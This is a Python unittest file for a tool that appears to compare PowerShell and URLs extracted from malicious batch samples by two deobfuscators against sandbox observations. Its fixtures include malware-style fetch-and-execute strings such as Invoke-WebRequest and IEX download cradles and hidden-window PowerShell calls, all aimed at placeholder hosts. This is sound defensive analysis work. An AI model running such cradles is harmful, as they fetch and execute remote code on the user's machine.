#!/usr/bin/env python3
"""Tests for compare_minusone.py."""

from __future__ import annotations

import importlib.util
import unittest
from pathlib import Path


SCRIPT = Path(__file__).with_name("compare_minusone.py")
SPEC = importlib.util.spec_from_file_location("compare_minusone", SCRIPT)
assert SPEC is not None
compare_minusone = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(compare_minusone)


class CompareMinusOneTests(unittest.TestCase):
    def test_extract_ps_candidates_uses_report_fields_and_traits(self) -> None:
        report = {
            "deobfuscated": "echo no ps here",
            "extracted": {
                "powershell": 1,
                "powershell_samples": ["Invoke-WebRequest https://sample.example/a"],
            },
            "traits": [
                {
                    "kind": "PowerShell",
                    "cmd": "powershell -nop",
                    "script": "iwr https://trait.example/b",
                }
            ],
        }

        candidates = compare_minusone.extract_ps_candidates(report)
        self.assertIn("Invoke-WebRequest https://sample.example/a", candidates)
        self.assertIn("iwr https://trait.example/b", candidates)

    def test_extract_ps_candidates_prefers_banner_payload_over_whole_deob(self) -> None:
        report = {
            "deobfuscated": "::==== batdeob: extracted PowerShell payload ====\n"
            "Invoke-WebRequest https://banner.example/a\n"
            "::==== end extracted PowerShell payload ====\n"
            "echo wrapper",
            "traits": [],
        }
        candidates = compare_minusone.extract_ps_candidates(report)
        self.assertEqual(candidates, ["Invoke-WebRequest https://banner.example/a"])

    def test_url_diff_reports_minusone_only_urls(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="Invoke-WebRequest https://known.example/a",
            minusone_text="Invoke-WebRequest https://known.example/a https://new.example/b",
        )
        self.assertEqual(row["minusone_only_urls"], ["https://new.example/b"])
        self.assertEqual(row["bucket"], "minusone-url-gain")

    def test_url_diff_compares_against_all_harrington_candidates(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="Invoke-WebRequest https://known.example/a",
            minusone_text="Invoke-WebRequest https://other.example/b",
            harrington_compare_text="https://known.example/a https://other.example/b",
        )
        self.assertEqual(row["minusone_only_urls"], [])
        self.assertEqual(row["bucket"], "harrington-url-only")

    def test_url_diff_ignores_prefix_urls(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="Invoke-WebRequest https://host.example/full/path",
            minusone_text="Invoke-WebRequest https://host.example",
        )
        self.assertEqual(row["minusone_only_urls"], [])
        self.assertEqual(row["harrington_only_urls"], [])
        self.assertEqual(row["bucket"], "same")

    def test_url_diff_ignores_case_only_differences(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="Invoke-WebRequest http://host.example/PWS.vbs",
            minusone_text="Invoke-WebRequest http://host.example/pws.vbs",
        )
        self.assertEqual(row["minusone_only_urls"], [])
        self.assertEqual(row["harrington_only_urls"], [])
        self.assertEqual(row["bucket"], "same")

    def test_scan_urls_drops_empty_hosts(self) -> None:
        self.assertEqual(compare_minusone.scan_urls("iwr http://"), set())

    def test_scan_urls_drops_single_label_http_hosts(self) -> None:
        self.assertEqual(compare_minusone.scan_urls("iwr http://ki"), set())
        self.assertEqual(
            compare_minusone.scan_urls("iwr http://host.example/a"),
            {"http://host.example/a"},
        )

    def test_classifies_readability_gain_without_new_urls(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="$a='gnirtSdaolnwoD'",
            minusone_text="DownloadString('https://same.example/p')",
        )
        self.assertEqual(row["minusone_only_urls"], ["https://same.example/p"])

    def test_extract_observed_urls_from_nested_sandbox_json(self) -> None:
        observed = {
            "curtain": {"amsi": "Invoke-WebRequest https://amsi.example/p"},
            "processes": [
                {"command_line": "powershell iwr http://proc.example/a"},
                {"command_line": "cmd /c echo benign"},
            ],
        }
        urls = compare_minusone.extract_observed_urls(observed)
        self.assertEqual(urls, {"https://amsi.example/p", "http://proc.example/a"})

    def test_extract_observed_commands_from_nested_sandbox_json(self) -> None:
        observed = {
            "curtain": {"amsi": "$u='http://amsi.example/a'; IEX $u"},
            "processes": [
                {"command_line": "cmd.exe /c powershell -nop -w hidden"},
                {"command_line": "C:\\Windows\\System32\\notepad.exe"},
            ],
        }
        commands = compare_minusone.extract_observed_commands(observed)
        self.assertIn("$u='http://amsi.example/a'; IEX $u", commands)
        self.assertIn("cmd.exe /c powershell -nop -w hidden", commands)
        self.assertNotIn("C:\\Windows\\System32\\notepad.exe", commands)

    def test_compare_with_observed_marks_observed_only_urls(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="Invoke-WebRequest https://known.example/a",
            minusone_text="Invoke-WebRequest https://known.example/a",
            observed_urls={"https://sandbox.example/missed"},
        )
        self.assertEqual(row["observed_only_urls"], ["https://sandbox.example/missed"])
        self.assertEqual(row["bucket"], "observed-url-gap")

    def test_compare_with_observed_marks_observed_only_commands(self) -> None:
        row = compare_minusone.compare_texts(
            sample_id="sha",
            source_name="sample.bat",
            harrington_text="echo wrapper",
            minusone_text="echo wrapper",
            observed_commands={"powershell -nop -c Invoke-WebRequest https://cmd.example/a"},
        )
        self.assertEqual(
            row["observed_only_commands"],
            ["powershell -nop -c Invoke-WebRequest https://cmd.example/a"],
        )
        self.assertEqual(row["bucket"], "observed-command-gap")

    def test_minusone_command_sets_powershell_language(self) -> None:
        command = compare_minusone.minusone_command("/bin/minusone", "/tmp/sample.ps1")
        self.assertEqual(
            command,
            ["/bin/minusone", "--lang", "powershell", "--path", "/tmp/sample.ps1"],
        )


if __name__ == "__main__":
    unittest.main()
